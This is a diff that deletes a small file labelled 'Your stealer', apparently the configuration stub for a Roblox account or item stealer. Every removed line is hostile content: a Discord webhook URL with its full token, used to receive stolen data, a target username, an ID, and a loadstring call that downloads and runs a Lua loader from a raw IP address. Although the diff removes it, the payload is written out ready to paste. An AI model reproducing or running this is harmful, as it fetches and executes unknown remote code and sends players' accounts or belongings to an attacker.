@@ -1,6 +1,0 @@
-Your stealer
-webhook: https://discord.com/api/webhooks/1432017984242847866/bD7U5fUqWcEgBYps2FdkFhHdBXtQJuRGy67LINjR4xxfLr2WrqZoGjwg6__qeAsuULLw``
-usernames: cooltoniqw1
-
-ID="8488beb6-d6b7-4949-88a0-fa1da6482670";
-loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
